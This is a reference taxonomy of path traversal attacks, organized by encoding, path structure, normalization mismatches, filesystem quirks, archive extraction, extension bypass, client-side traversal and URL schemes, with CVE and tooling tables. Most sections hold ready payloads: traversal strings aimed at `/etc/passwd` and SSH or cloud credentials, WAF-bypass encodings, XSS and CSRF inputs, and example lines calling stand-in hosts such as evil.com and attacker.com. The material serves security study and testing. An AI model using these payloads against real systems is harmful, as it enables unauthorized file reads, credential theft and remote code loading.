# Path Traversal Mutation/Variation Taxonomy

**Version**: 2025
**Scope**: Server-Side and Client-Side Path Traversal Attacks

---

## Classification Structure

Path traversal vulnerabilities exploit discrepancies in how different system components interpret file paths and URLs. This taxonomy organizes attack vectors along three axes:

**Axis 1 (Primary)**: **Mutation Target** — the structural component of the path being manipulated (encoding, separators, normalization, filesystem semantics, archives, extensions, protocols).

**Axis 2 (Cross-Cutting)**: **Discrepancy Type** — the nature of the parsing/interpretation mismatch that enables the attack.

**Axis 3 (Deployment)**: **Attack Scenario** — the architectural context where the mutation becomes weaponizable.

### Cross-Cutting Discrepancy Types (Axis 2)

Path traversal attacks exploit mismatches between components that process the same path differently:

| Discrepancy Type | Mechanism | Common Pairs |
|-----------------|-----------|--------------|
| **Parsing Differential** | Two parsers interpret path structure differently | Cache vs Origin, Proxy vs Backend, WAF vs App |
| **Normalization Mismatch** | One component canonicalizes paths, the other doesn't | CDN vs Server, Filter vs Filesystem API |
| **Encoding Interpretation** | Components decode at different stages or depths | Frontend (1 pass) vs Backend (2 passes) |
| **Multi-Stage Processing** | Sequential decode/encode creates new sequences | `....//` → `../` after strip, `%252e` → `%2e` → `.` |
| **Platform Handler Difference** | OS or framework-specific path interpretation | Windows (accepts `\` and `/`) vs Linux (`/` only) |
| **Validation-Execution Gap** | Validator sees safe path, executor sees traversal | Null byte: validator sees `.jpg%00`, executor stops at `%00` |

---

## §1. Encoding Layer Mutations

Encoding mutations exploit differences in how systems decode special characters. Attackers leverage single, double, triple, or mixed encoding to bypass filters that operate at specific decoding stages.

### §1-1. URL Encoding (Percent Encoding)

Standard URL encoding replaces characters with `%XX` hexadecimal representation. Effective when validators check raw input but backends decode before use.

| Subtype | Mechanism | Example Payload | Key Condition |
|---------|-----------|-----------------|---------------|
| **Single URL Encoding** | Dot (`%2e`) and slash (`%2f`) encoded once | `/%2e%2e/%2e%2e/%2e%2e/etc/passwd` | Backend decodes, validator doesn't |
| **Double URL Encoding** | Apply encoding twice | `/%252e%252e/%252e%252e/etc/passwd` | Two sequential decode stages |
| **Triple URL Encoding** | Three encoding layers | `/%25252e%25252e/etc/passwd` | Three-tier architecture with decode at each |
| **Mixed Encoding** | Combine encoded and plain characters | `/%2e./` or `/.%2e/` | Partial decoding or regex bypass |
| **Case Variation** | Uppercase hex (`%2E` vs `%2e`) | `/%2E%2E/%2E%2E/etc/passwd` | Case-sensitive filters |

**Notable CVE**: CVE-2024-38819 (Spring Framework) — malicious HTTP requests with encoded traversal sequences accessed arbitrary files via WebMvc.fn/WebFlux.fn static resource handlers.

### §1-2. Unicode Encoding

Exploits Unicode representations of path characters. Particularly effective against systems performing Unicode normalization after validation.

| Subtype | Mechanism | Example Payload | Key Condition |
|---------|-----------|-----------------|---------------|
| **Standard Unicode** | Use `%uXXXX` format | `%u002e%u002e%u002f` (dot, dot, slash) | Legacy IIS or Windows parsers |
| **Fullwidth Characters** | Unicode fullwidth variants | `％２ｅ` (U+FF05, U+FF12, U+FF45) | Unicode normalization post-validation |
| **Canonical Equivalence** | Different codepoints, same glyph | U+FF0E (fullwidth full stop) → `.` | NFKC normalization |
| **Compatibility Forms** | Decomposed vs composed | Various combining sequences | Form normalization after check |

**Notable CVE**: CVE-2024-43093 (Android ExternalStorageProvider) — incorrect Unicode normalization allowed path traversal to bypass file path filters, leading to local privilege escalation. CVE-2025-52488 (DNN/DotNetNuke) used U+FF0E and U+FF3C to bypass validation.

### §1-3. Overlong UTF-8 Encoding

Non-standard multi-byte UTF-8 representations bypass validators expecting canonical single-byte encoding. Most modern systems reject these, but legacy applications remain vulnerable.

| Subtype | Mechanism | Example Payload | Key Condition |
|---------|-----------|-----------------|---------------|
| **2-Byte Overlong Dot** | Dot as 2 bytes | `%c0%2e` or `%c0%ae` | UTF-8 decoder accepts non-minimal |
| **2-Byte Overlong Slash** | Slash as 2 bytes | `%c0%af` | Same as above |
| **3-Byte Overlong** | Slash as 3 bytes | `%e0%80%af` | Deeper overlong tolerance |
| **Mixed Overlong** | Combine with standard | `%c0%ae%c0%ae%c0%af` | Partial overlong rejection |

**Historical Context**: Common in early 2000s IIS vulnerabilities; largely mitigated by strict UTF-8 validation in RFC 3629.

### §1-4. Null Byte Injection

Inserts URL-encoded null byte (`%00`) to truncate string processing. Exploits languages (C, PHP < 5.3.4, .NET < 8.0) where null terminates strings at a lower level than validation.

| Subtype | Mechanism | Example Payload | Key Condition |
|---------|-----------|-----------------|---------------|
| **Extension Bypass** | Append null before required extension | `../../etc/passwd%00.jpg` | Validator sees `.jpg`, filesystem stops at `%00` |
| **Path Truncation** | Terminate path mid-sequence | `../../secret%00/public/file.txt` | Lower-level API truncates at null |
| **Filter Evasion** | Break pattern matching | `../%00../` | Regex doesn't cross null boundary |

**Notable CVE**: CVE-2024-28698 (CSLA.NET) — `LoadFromAssemblyPath` truncated at null byte, similar to classic PHP null byte attacks. Patched in version 8.0.

---

## §2. Path Structure Mutations

Manipulate dots, separators, and segment sequences to exploit normalization differences or bypass pattern-based filters.

### §2-1. Dot Segment Variations

Exploit how systems resolve `.` (current directory) and `..` (parent directory) during path canonicalization.

| Subtype | Mechanism | Example Payload | Key Condition |
|---------|-----------|-----------------|---------------|
| **Standard Traversal** | Classic `../` sequences | `../../../../etc/passwd` | No validation or weak depth check |
| **Nested Sequences** | Inner sequence stripped, outer remains | `....//` or `....\/` | Filter strips `../` once → `../` remains |
| **Dot-Dot-Slash Variants** | Extra dots or slashes | `...//`, `.../`, `..../` | Incomplete regex patterns |
| **Encoded Dots Only** | Encode dots, leave slashes | `%2e%2e/` or `.%2e/` | Asymmetric decoding |
| **Reverse Nested** | Decoy sequences | `/.././` or `/...//` | Path normalization resolves decoy |

### §2-2. Separator Manipulation

Exploits platform-specific separator handling (Windows accepts both `\` and `/`, Linux only `/`).

| Subtype | Mechanism | Example Payload | Key Condition |
|---------|-----------|-----------------|---------------|
| **Backslash (Windows)** | Use Windows separator | `..\..\..\windows\win.ini` | Windows backend, Linux WAF |
| **Mixed Separators** | Alternate `\` and `/` | `..\..\../etc/passwd` | Parser confusion |
| **Double Separators** | Multiple slashes | `....//` or `..\\` | Normalization collapses doubles |
| **Encoded Separators** | Percent-encode slashes | `..%2f` or `..%5c` (backslash) | Decode after validation |
| **UNC Path Injection** | Windows network paths | `\\localhost\c$\windows\win.ini` | Windows-specific UNC handler |

**Platform Impact**: Windows systems allow both separators, creating asymmetry when frontend (Linux WAF) sees `\` as literal but backend (Windows) interprets as separator.

### §2-3. Absolute Path Injection

Bypasses relative path validation by specifying absolute filesystem paths directly.

| Subtype | Mechanism | Example Payload | Key Condition |
|---------|-----------|-----------------|---------------|
| **Direct Absolute** | Full path from root | `/etc/passwd` or `C:\windows\win.ini` | No absolute path filter |
| **Protocol-Prefixed** | Java-specific protocol handler | `url:file:///etc/passwd` | Java URL class processes `url:` prefix |
| **Drive Letter (Windows)** | Explicit drive specification | `C:/inetpub/wwwroot/web.config` | Windows backend accepts drive |
| **UNC Share Access** | Network share syntax | `\\server\share\file.txt` | Windows SMB/UNC enabled |

**Notable Example**: Java applications using `URL` class may process `url:file://` prefix, enabling local file access even when HTTP URL expected.

### §2-4. Trailing and Leading Manipulation

Exploits inconsistent handling of trailing slashes, spaces, or dots.

| Subtype | Mechanism | Example Payload | Key Condition |
|---------|-----------|-----------------|---------------|
| **Trailing Slash** | Append `/` to filename | `../../etc/passwd/` | Access rule checks prefix, trailing `/` bypasses |
| **Trailing Dot (Windows)** | Append `.` (Windows strips) | `../../secret.txt.` | Windows normalizes away dot |
| **Trailing Space** | Append space (Windows strips) | `../../file.txt ` | Windows filesystem trims spaces |
| **Leading Slash Duplication** | Prefix with extra slashes | `///etc/passwd` or `\\\\windows\\` | Normalization collapses to single |

**Windows-Specific**: Windows filesystem automatically strips trailing dots and spaces, but application-layer validation may not, creating a bypass window.

---

## §3. Normalization Process Exploitation

Attacks targeting path canonicalization, dot-segment resolution, and symbolic link handling discrepancies.

### §3-1. Cache vs Origin Normalization Mismatch

Exploits differences in how CDNs/caches and origin servers normalize paths before applying routing or caching rules.

| Subtype | Mechanism | Example Payload | Key Condition |
|---------|-----------|-----------------|---------------|
| **Encoded Traversal in Static Path** | Cache doesn't resolve dots, origin does | `/static/%2e%2e/profile` | Cache stores as `/static/..`, origin resolves to `/profile` |
| **Delimiter-Hidden Traversal** | Character is delimiter for origin, not cache | `/api<semicolon>/../admin` | Cache sees literal `;`, origin treats as path delimiter |
| **Pre-Normalization Cache Rule** | Cache rules applied before normalization | `/images/../api/user` | Cache stores (no normalization), origin normalizes and routes |

**Research Foundation**: PortSwigger's "Gotta Cache 'Em All" (2024-2025) — identified parser discrepancies where Cloudflare/Fastly/Google Cloud skip normalization before cache rules, while Nginx/IIS/OpenLiteSpeed normalize before routing.

**Impact**: Web cache deception — attacker tricks cache into storing victim's sensitive dynamic content (e.g., `/api/account/../static/style.css` caches as static but serves `/api/account`).

### §3-2. WAF vs Application Normalization

Web Application Firewalls and backend applications canonicalize paths at different stages, creating bypass opportunities.

| Subtype | Mechanism | Example Payload | Key Condition |
|---------|-----------|-----------------|---------------|
| **Pre-Decode WAF, Post-Decode App** | WAF sees encoded, app decodes | `/%2e%2e/admin` | WAF doesn't decode `%2e`, app does |
| **Single-Decode WAF, Multi-Decode App** | App decodes multiple times | `/%252e%252e/` (double encoded) | WAF decodes once, app twice |
| **Path Parameter Confusion** | WAF misparses parameter boundary | `/file;name=..%2f..%2fetc/passwd` | WAF treats `;` differently than app |

**Notable Vulnerability**: CVE-2024-1019 (ModSecurity v3 < 3.0.12, v2 unfixed) — ModSecurity URL-decodes before parsing parameters. Payload `/path%3Fignored?real=../../etc/passwd` bypasses because `%3F` (encoded `?`) causes ModSecurity to exclude `real=` from `REQUEST_FILENAME`, but backend includes it in path.

### §3-3. Proxy vs Backend Parser Differential

Reverse proxies (Nginx, Apache, HAProxy) and backend servers (Tomcat, IIS, Node.js) interpret path syntax differently.

| Subtype | Mechanism | Example Payload | Key Condition |
|---------|-----------|-----------------|---------------|
| **Semicolon Path Parameter** | Nginx treats `;` as directory, Tomcat as parameter | `/admin/..;/` | Nginx sees `/admin/../`, Tomcat ignores `;/` |
| **Directory Index Confusion** | Proxy auto-appends `index.html`, backend processes raw | `/secret/..%2findex.html` | Proxy routing vs backend path resolution |
| **Method-Based Routing** | Proxy routes by path, backend by path + method | `/public/../admin` (POST) | Proxy allows path, backend restricts by method |

**Classic Tomcat Bypass**: Nginx reverse proxy to Tomcat backend — `/protected/..;/admin.jsp` → Nginx sees directory traversal to root → Tomcat ignores `;` as parameter separator → accesses `/admin.jsp`.

### §3-4. Symbolic Link Resolution

Exploits symlink handling differences between validation and execution phases.

| Subtype | Mechanism | Example Payload | Key Condition |
|---------|-----------|-----------------|---------------|
| **Symlink Chain** | Create symlink pointing outside allowed directory | `allowed/link -> /etc/passwd` | Validator checks `allowed/link`, filesystem follows symlink |
| **TOCTOU Symlink Race** | Replace file with symlink between check and use | Check: `file.txt` (safe) → Race → Use: `file.txt -> /etc/shadow` | Time window between validation and access |
| **Relative Symlink Exploitation** | Symlink with relative path | `link -> ../../../secret` | Canonicalization doesn't resolve symlink target |

**Mitigation Bypass**: Even when using `realpath()` for canonicalization, if symlink creation is possible post-validation, TOCTOU race conditions enable exploitation.

---

## §4. Filesystem Semantics Exploitation

Leverages OS-specific filesystem behaviors, reserved names, case sensitivity, and file system quirks.

### §4-1. Platform-Specific Reserved Names (Windows)

Windows reserves device names that cannot exist as files. Exploited to trigger special behaviors or bypass filters.

| Subtype | Mechanism | Example Payload | Key Condition |
|---------|-----------|-----------------|---------------|
| **DOS Device Names** | Reserved names map to devices | `CON`, `PRN`, `AUX`, `NUL`, `COM1-9`, `LPT1-9` | Windows backend |
| **Reserved Name with Extension** | Append extension (Windows ignores) | `CON.txt`, `AUX.log` | Filter checks extension, Windows ignores |
| **UNC Device Path** | Access via `\\.\` prefix | `\\.\C:\windows\win.ini` | Direct device access |
| **Alternate Data Streams (ADS)** | NTFS ADS syntax | `file.txt::$DATA` or `file.txt:hidden.txt` | NTFS filesystem |

**Exploitation Context**: Accessing `CON` in HTTP request on Windows can trigger application hangs (writing to console device); bypasses file existence checks.

### §4-2. Case Sensitivity Exploitation

Unix/Linux filesystems are case-sensitive (`File.txt` ≠ `file.txt`), Windows/Mac are case-insensitive. Exploited when validator and filesystem have different case handling.

| Subtype | Mechanism | Example Payload | Key Condition |
|---------|-----------|-----------------|---------------|
| **Case Variation Bypass** | Change case to evade blocklist | `/eTc/pAsSwD` on case-insensitive system | Filter checks exact case, filesystem doesn't |
| **Mixed-Case Encoding** | Combine case with encoding | `%2E%2e/ETC/passwd` | Case-sensitive filter, case-insensitive FS |

**Attack Scenario**: Blocklist contains `/etc/passwd` → attacker uses `/etc/PASSWD` → Windows backend serves file, Linux filter blocks.

### §4-3. Long Path Exploitation (Windows)

Windows has path length limits (260 chars for MAX_PATH), but APIs bypass with `\\?\` prefix. Exploit inconsistent limit enforcement.

| Subtype | Mechanism | Example Payload | Key Condition |
|---------|-----------|-----------------|---------------|
| **Path Length Overflow** | Exceed MAX_PATH to cause truncation | `A` × 300 + `../../etc/passwd` | Validator truncates, different segment accessed |
| **Extended-Length Path Prefix** | Use `\\?\` to bypass MAX_PATH | `\\?\C:\very\long\path\...` | Extended-length API enabled |

**Rare but impactful**: If validator enforces 260-char limit by truncation but backend uses extended API, truncated validation passes but full path executes.

### §4-4. Hidden Files and Directory Traversal

Unix hidden files (prefix `.`) and Windows hidden attribute exploited to access concealed configuration files.

| Subtype | Mechanism | Example Payload | Key Condition |
|---------|-----------|-----------------|---------------|
| **Dot-Prefix Files** | Access Unix hidden config files | `../../.env`, `../../.git/config` | Hidden file enumeration allowed |
| **Double-Dot Confusion** | Validator treats `..` as traversal, misses `.` files | `/.ssh/id_rsa` via `/./.ssh/id_rsa` | Overly aggressive `..` blocking |

**High-Value Targets**: `.env` (environment secrets), `.git/config` (repo metadata), `.aws/credentials`, `.ssh/id_rsa`.

---

## §5. Archive Extraction Exploitation (Zip Slip & Variants)

Path traversal in archive extraction contexts — attackers craft malicious archives with traversal sequences in filenames, exploiting poor path validation during extraction.

### §5-1. Zip Slip (Archive Path Traversal)

Malicious archive contains entries with `../` in filename field. When extracted, files write outside intended directory.

| Subtype | Mechanism | Example Archive Entry | Key Condition |
|---------|-----------|----------------------|---------------|
| **Basic Zip Slip** | Filename field contains traversal | `../../evil.sh` | Extractor doesn't canonicalize |
| **Nested Archive** | Archive within archive | `outer.zip` → `inner.zip` → `../../payload` | Recursive extraction without validation |
| **Absolute Path in Archive** | Full path in filename | `/etc/cron.d/backdoor` | Extractor honors absolute paths |
| **Platform-Specific Separators** | Use Windows `\` in filename | `..\..\evil.exe` | Cross-platform extraction (Linux creates file named `..\..\evil.exe`, Windows traverses) |

**Notable CVE**: CVE-2024-21518 (OpenCart Marketplace Installer) — ZIP Slip via admin panel allowed arbitrary file write.

**Impact**: Remote code execution when payload overwrites executable files, cron jobs, or service configurations.

### §5-2. Symlink in Archive (Zip Symlink Vulnerability)

Archive contains symbolic link entry pointing outside extraction directory. Upon extraction, symlink is created, then subsequent archive entries write through the symlink.

| Subtype | Mechanism | Example Sequence | Key Condition |
|---------|-----------|------------------|---------------|
| **Symlink-Then-Write** | 1. Create symlink to `/etc/`, 2. Write `link/passwd` | Entry 1: `link -> /etc`, Entry 2: `link/cron.d/backdoor` | Extractor creates symlinks before validation |
| **Symlink Chain** | Chain of symlinks leading outside | `link1 -> link2 -> /var/www/` | Multi-hop symlink resolution |
| **Relative Symlink** | Symlink uses relative path | `link -> ../../../sensitive/` | Relative resolution from extraction directory |

**Detection**: Tools like CodeQL flag unsafe archive extraction without symlink validation (`go-unsafe-unzip-symlink` query).

### §5-3. Archive Format-Specific Exploits

Different archive formats (ZIP, TAR, 7z, JAR, APK, IPA) have unique path handling quirks.

| Subtype | Mechanism | Format | Key Condition |
|---------|-----------|--------|---------------|
| **TAR Path Traversal** | TAR allows absolute paths in header | TAR, TGZ | No absolute path sanitization |
| **7z Long Path** | 7z supports very long filenames | 7Z | Filename length validation missing |
| **JAR/WAR Traversal** | Java archives are ZIP format | JAR, WAR, EAR | Java extraction libraries vulnerable to Zip Slip |
| **APK/IPA Traversal** | Mobile app packages | APK (Android), IPA (iOS) | Mobile SDK extraction without validation |

**Tool**: `slip` CLI tool generates malicious archives with path traversal payloads for testing (supports ZIP, TAR, 7z, JAR, WAR, APK, IPA).

---

## §6. Extension Validation Bypass

Exploit weak file extension checks by manipulating how validators versus executors interpret file extensions.

### §6-1. Null Byte Extension Bypass

Covered in §1-4 but specific to extension validation context. Append `%00` before required extension to bypass validator while filesystem truncates.

| Subtype | Mechanism | Example Payload | Key Condition |
|---------|-----------|-----------------|---------------|
| **Extension Suffix Injection** | Add required extension after null | `../../evil.php%00.jpg` | Validator sees `.jpg`, PHP interpreter stops at `%00` and executes `evil.php` |

**Historical**: Prevalent in PHP < 5.3.4. Largely patched but reappears in non-PHP contexts (CVE-2024-28698 in .NET).

### §6-2. Double Extension and Case Manipulation

Exploit inconsistent extension parsing between validator and executor.

| Subtype | Mechanism | Example Payload | Key Condition |
|---------|-----------|-----------------|---------------|
| **Double Extension** | Append multiple extensions | `shell.php.jpg` | Validator checks last extension (`.jpg`), server processes first (`.php`) |
| **Case Variation** | Change extension case | `shell.PhP` or `shell.pHp` | Case-sensitive allowlist, case-insensitive execution |
| **Null in Extension** | Null byte within extension | `shell.ph%00p` | Extension parser confused |

**Server-Specific**: Apache with `AddHandler` processes based on first extension in some configs; IIS may process based on ISAPI filter order.

### §6-3. MIME Type vs Extension Mismatch

When validator checks MIME type (Content-Type header) but server routes by file extension.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **MIME Spoofing** | Upload PHP with image MIME type | `Content-Type: image/jpeg`, filename: `shell.php` | Validator checks MIME, executor checks extension |
| **Polyglot File** | File valid as both image and script | JPEG header + PHP code | Magic byte validation passes, script executes |

---

## §7. Client-Side Path Traversal (CSPT)

Exploits client-side JavaScript `fetch()` or `XMLHttpRequest` calls where user input is embedded in URL path without proper encoding, allowing attackers to navigate to unintended endpoints.

### §7-1. CSPT via Fetch API Manipulation

Frontend JavaScript constructs request URL by concatenating user input. Attacker injects `../` to redirect to different endpoint.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Basic CSPT** | Inject `../` in fetch path parameter | `fetch(/api/items/${id})`, `id=../users/admin` → `/api/users/admin` | No URL encoding of user input |
| **Double-Encoded CSPT** | Use `%2e%2e%2f` to bypass client-side filter | `id=%2e%2e%2fusers` → Browser decodes → `/api/../users` | Frontend doesn't decode before concatenation |
| **Fragment Bypass** | Use URL fragment to hide traversal | `id=../../admin%23normalpath` | Fragment ignored by server, path traversed |

**Research Reference**: Doyensec's 2025 research "Bypassing File Upload Restrictions To Exploit Client-Side Path Traversal" — demonstrated chaining file upload with CSPT.

### §7-2. CSPT to XSS

Redirect fetch to endpoint with reflected XSS or JSONP callback.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **JSONP Callback Injection** | Traverse to JSONP endpoint with callback | `id=../pricing/default.js?cb=alert(document.domain)//` | Traversal reaches JSONP endpoint |
| **Reflected XSS Endpoint** | Traverse to endpoint reflecting parameter | `id=../search?q=<script>alert(1)</script>` | XSS sink accessible via traversal |

**Attack Chain**: CSPT → Access unintended endpoint → Endpoint reflects attacker-controlled data → XSS in origin context.

### §7-3. CSPT to CSRF

Exploit CSPT to redirect authenticated requests to state-changing endpoints, bypassing CSRF protections.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **GET-Based CSRF** | Traverse to GET endpoint performing state change | `id=../admin/deleteUser?user=victim` | GET request with authentication cookies |
| **POST-Based CSRF** | Use POST fetch with traversal | `fetch('/api/items/${id}', {method: 'POST', body})`, `id=../admin/promote` | Frontend adds CSRF tokens, traversal redirects |
| **Method Override** | Combine traversal with `_method` parameter | `id=../users/delete?_method=DELETE` | Framework supports method override |

**SameSite Bypass**: CSPT occurs on same origin, so `SameSite=Lax` cookies are sent, bypassing cookie-based CSRF protection.

**Tooling**: Doyensec's `CSPTBurpExtension` detects CSPT vulnerabilities in Burp Suite.

---

## §8. Protocol and Scheme Manipulation

Exploit protocol handlers and scheme parsing to access unintended resources or bypass URL validation.

### §8-1. File Protocol Injection

Inject `file://` scheme to access local filesystem instead of HTTP resources.

| Subtype | Mechanism | Example Payload | Key Condition |
|---------|-----------|-----------------|---------------|
| **Direct File URI** | Replace HTTP with file scheme | `file:///etc/passwd` | Application doesn't whitelist schemes |
| **File via Redirect** | HTTP endpoint redirects to file:// | `http://evil.com/redirect.php` → `file:///etc/passwd` | Redirect following enabled |
| **Java URL Protocol** | Prefix with `url:` | `url:file:///etc/passwd` | Java `URL` class processes prefix |

**Context**: Server-Side Request Forgery (SSRF) overlap — when application fetches user-provided URL, `file://` scheme enables local file read.

### §8-2. UNC Path Injection (Windows)

Windows Universal Naming Convention paths for network shares exploited to access local files via `\\` syntax.

| Subtype | Mechanism | Example Payload | Key Condition |
|---------|-----------|-----------------|---------------|
| **Localhost UNC** | Access local drive as network share | `\\localhost\c$\windows\win.ini` | Windows backend, UNC enabled |
| **Administrative Share** | Use default admin shares | `\\127.0.0.1\c$\`, `\\localhost\admin$\` | Administrative privileges |
| **Long UNC Path** | Bypass MAX_PATH with UNC | `\\?\UNC\server\share\...` | Extended-length UNC |

**NTLM Relay Risk**: Requesting UNC path to attacker-controlled server can leak NTLM hashes.

### §8-3. Data URI and Other Schemes

Exploit scheme handlers to inject code or exfiltrate data.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Data URI XSS** | Inject `data:text/html,<script>...</script>` | CSPT redirects to data URI | Browser executes data URI content |
| **Jar Protocol** | Java JAR file URL scheme | `jar:http://evil.com/app.jar!/` | Java application processes JAR URLs |
| **FTP Scheme** | Redirect to FTP for credential capture | `ftp://user:pass@attacker.com/` | FTP client auto-authenticates |

---

## Attack Scenario Mapping (Axis 3)

Path traversal mutations are weaponized in specific architectural deployment contexts. This table maps scenarios to the most relevant mutation categories.

| Scenario | Architecture & Conditions | Primary Mutation Categories | Impact |
|----------|--------------------------|----------------------------|--------|
| **Server-Side Arbitrary File Read** | Web server serving static files; user input in file path | §1 (Encoding), §2 (Path Structure), §3 (Normalization), §4 (Filesystem) | Read `/etc/passwd`, `/etc/shadow`, application source code, credentials, private keys |
| **Client-Side Path Traversal (CSPT)** | SPA/PWA with client-side fetch; user input in URL path | §7 (CSPT), §1 (Double Encoding) | XSS via JSONP, CSRF bypass, authentication token theft |
| **Web Cache Deception** | CDN/cache layer + origin server; path-based cache rules | §3-1 (Cache vs Origin), §2 (Separators), §1 (Encoding) | Cache victim's private data (API responses, account pages); steal auth tokens, session data |
| **Archive Extraction Exploit (Zip Slip)** | Application extracts user-uploaded archives | §5 (Archive Extraction), §5-2 (Symlink) | RCE via cron job overwrite, web shell upload, config file replacement |
| **Authentication/Authorization Bypass** | ACL rules based on URL path; reverse proxy routing | §3-3 (Proxy vs Backend), §2-3 (Absolute Path), §8 (Scheme) | Access admin panels, privileged APIs, internal services |
| **WAF/Security Control Bypass** | WAF in front of application; rule-based path blocking | §3-2 (WAF vs App), §1 (Encoding), §2-1 (Nested) | Evade detection for SQLi, XSS, RCE payloads; access blocked endpoints |
| **Container Escape** | Docker/Kubernetes; application reads files via user input | §2-3 (Absolute Path), §4 (Filesystem), §3-4 (Symlink) | Read host filesystem (`/proc`, `/sys`), steal secrets (`/run/secrets/kubernetes.io/serviceaccount/token`) |
| **Cloud Metadata Access** | Cloud VM (AWS, GCP, Azure); SSRF or file read vulnerability | §8-1 (File/HTTP Schemes), §2 (Path Structure) | Steal instance credentials via `http://169.254.169.254/latest/meta-data/` |
| **Relative Path Overwrite (RPO) / RPFI** | Web page with relative resource links; path reflection | §2-4 (Trailing/Leading), §3 (Normalization) | CSS injection (defacement), malicious file download (RPFI evolution 2024) |

---

## CVE / Bounty Mapping (2024-2025)

Real-world path traversal instances from recent disclosures, mapped to mutation combinations.

| Mutation Combination | CVE / Case | Impact / Bounty | Details |
|---------------------|-----------|----------------|---------|
| §1-1 + §3-1 | **CVE-2024-38819** (Spring Framework) | Critical — arbitrary file read | WebMvc.fn/WebFlux.fn serving static resources; URL-encoded traversal sequences (`%2e%2e%2f`) bypassed path validation |
| §1-2 | **CVE-2024-43093** (Android) | High — local privilege escalation | ExternalStorageProvider incorrect Unicode normalization; attackers used fullwidth characters to bypass path filters |
| §1-2 | **CVE-2025-52488** (DNN/DotNetNuke) | High — arbitrary file access | Unicode U+FF0E (fullwidth full stop) and U+FF3C (fullwidth reverse solidus) bypassed initial validation |
| §1-4 + §6-1 | **CVE-2024-28698** (CSLA.NET) | High — path traversal + RCE | `LoadFromAssemblyPath` truncated at null byte (`%00`); enabled arbitrary assembly loading |
| §1-4 | **CVE-2025-68428** (jsPDF ≤ 3.0.4) | Critical — local file disclosure | `loadFile` method in Node.js build; user-controlled path read arbitrary files into PDF output |
| §1-1 + §7 | **CVE-2024-13059** (AnythingLLM < 1.3.1) | Critical — RCE | Non-ASCII filename with traversal (`../../malicious.sh`) via multer library; manager/admin roles could write arbitrary files |
| §5-1 | **CVE-2024-21518** (OpenCart Marketplace) | High — arbitrary file write | ZIP Slip via marketplace installer; admin panel upload led to path traversal in archive extraction |
| §3-2 | **CVE-2024-1019** (ModSecurity v3 < 3.0.12) | Medium — WAF bypass | Path confusion via URL-encoded `?` (`%3F`); ModSecurity excluded post-`%3F` content from `REQUEST_FILENAME`, backend included it |
| §3-1 + §7 | **ChatGPT Account Takeover** (2024) | High — $15,000+ bounty (estimated) | Web cache deception via path confusion; traversal exploited CDN-origin normalization mismatch to cache auth tokens |
| §7-2 | **CSPT to CSRF Chain** (2024 PortSwigger Top 10 nomination) | Medium-High | Client-side path traversal chained with GET/POST CSRF; bypassed SameSite cookie protections |
| §5-2 | **Symlink Zip Exploitation** (2024 research) | High — RCE potential | Crafted symlinks in ZIP pointing outside extraction directory; subsequent entries wrote through symlink to system paths |
| §2-3 + §4-1 | **Windows Reserved Name DoS** (2024 bug bounty) | Low-Medium | Accessing `CON`, `AUX`, etc. in HTTP requests caused application hang; DoS on Windows servers |
| §3-1 | **Fortinet FortiWeb CVE-2025-64446** | Critical — authentication bypass | Path traversal in admin account creation; unauthenticated attackers created admin accounts via crafted path-traversal request |

---

## Detection Tools

Comprehensive tooling landscape for offensive testing and defensive detection.

| Tool | Type | Target Scope | Core Technique |
|------|------|-------------|---------------|
| **DotDotPwn** | Fuzzer | HTTP, FTP, TFTP, Payload, STDOUT | Protocol-independent path traversal fuzzer; Bisection Algorithm to determine traversal depth; Perl-based, cross-platform |
| **FDSploit** | Fuzzer | File inclusion, directory traversal | Automated discovery and exploitation; enumerates file paths to find true positives |
| **Burp Scanner** | DAST | Web applications | Automatically flags potential directory traversal; integrates with Burp Intruder for fuzzing |
| **Burp Intruder** | Fuzzer | Web applications | Insert directory traversal fuzz strings from custom wordlists; manual payload testing |
| **CSPTBurpExtension** (Doyensec) | Scanner | Client-side path traversal | Detects CSPT vulnerabilities in JavaScript fetch/XHR calls; Burp Suite extension |
| **slip** | Exploit Generator | Archive formats (ZIP, TAR, 7z, JAR, WAR, APK, IPA) | Creates malicious archives with path traversal payloads; CLI tool for Zip Slip testing |
| **IIS-ShortName-Scanner** | Scanner | IIS web servers | Enumerates 8.3 short filenames; exploits IIS tilde (`~`) vulnerability |
| **RPOscanner** | Scanner | Relative Path Overwrite | Detects RPO vulnerabilities in web applications |
| **PayloadsAllTheThings** | Wordlist Repository | All path traversal types | Curated payload lists for encoding, platform-specific, WAF bypass techniques |
| **Advanced Directory Traversal Payloads** (GitHub) | Wordlist | WAF bypass (Cloudflare, ModSecurity, Imperva, F5) | 800+ battle-tested payloads; encoding variations, parser differentials, cloud metadata |
| **CodeQL** (`go-unsafe-unzip-symlink`) | SAST | Go language archive extraction | Detects unsafe ZIP extraction without symlink validation |
| **Snyk** | SCA / SAST | Dependencies and source code | Flags known CVEs in libraries (e.g., Spring Framework CVE-2024-38819) |
| **NodeJS Path Traversal Scanner** | Scanner | Node.js applications | Specialized scanner for Node.js path traversal patterns |
| **Wfuzz** | Fuzzer | Web applications | General-purpose fuzzer; supports custom path traversal wordlists |
| **OWASP ZAP** | DAST | Web applications | Active scanner with directory traversal detection rules |

---

## Summary: Core Principles

### The Fundamental Vulnerability

Path traversal exists because **filesystems and URLs have multiple syntactically valid representations of the same location**, but **security controls operate on strings** rather than canonical paths. Three structural properties enable the entire mutation space:

1. **Encoding Diversity**: Characters like `.` and `/` can be represented as literals, URL-encoded (`%2e`, `%2f`), Unicode variants (U+FF0E), overlong UTF-8 (`%c0%ae`), or null-terminated (`%00`). Validators and executors decode at different stages or not at all.

2. **Normalization Inconsistency**: Path canonicalization (resolving `..`, `/./`, `//`, symlinks) is not standardized. Caches, proxies, WAFs, and backends each implement their own normalization logic, creating parser differentials. A path deemed "safe" by one component becomes dangerous after another normalizes it differently.

3. **Filesystem Semantics**: Operating systems handle paths in platform-specific ways — Windows accepts both `/` and `\` and strips trailing dots/spaces; Unix follows symlinks; archive formats support absolute paths in filenames. Security controls built for one platform fail on another.

### Why Incremental Patches Fail

Individual CVE fixes (e.g., blocking `../`, rejecting encoded dots) are trivially bypassed because:

- **Mutation depth**: Attackers combine techniques (e.g., double encoding + nested sequences + Unicode normalization) to evade single-layer defenses.
- **Architectural boundaries**: Path validation at the application layer doesn't prevent exploitation if the web server, reverse proxy, or filesystem layer interprets the path differently post-validation.
